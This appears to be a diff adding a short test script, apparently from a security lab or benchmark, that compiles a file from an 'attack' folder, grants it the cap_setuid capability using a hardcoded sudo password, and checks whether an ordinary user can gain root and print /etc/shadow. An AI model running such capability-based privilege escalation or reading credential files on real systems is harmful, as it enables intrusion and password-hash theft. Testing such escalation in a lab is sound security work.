@@ -1,0 +1,19 @@
+;
+#command
+cp /home/ubuntu/attack/cap.c /tmp/cap.c
+gcc /tmp/cap.c -o /tmp/cap
+echo '010404' | sudo -S setcap cap_setuid=ep /tmp/cap
+#check
+pri1=$(ls -n /tmp/cap | awk '{print $3}')
+content=$(/tmp/cap)
+pri2=$(echo "$content" | tail -n 1 | awk '{print $2}')
+shadow=$(echo "$content" | sed 's/UID: 0//')
+echo "/tmp/cap static UID:"
+echo $pri1
+echo "/tmp/cap run UID:"
+echo $pri2
+echo "normal user exec /tmp/cap to cat /etc/shadow:"
+echo $shadow
+if [ "$pri1" = "$pri2" ]; then echo "No such file or directory"; fi
+#cleanup
+echo '010404' | sudo -S rm -f /tmp/cap /tmp/cap.c
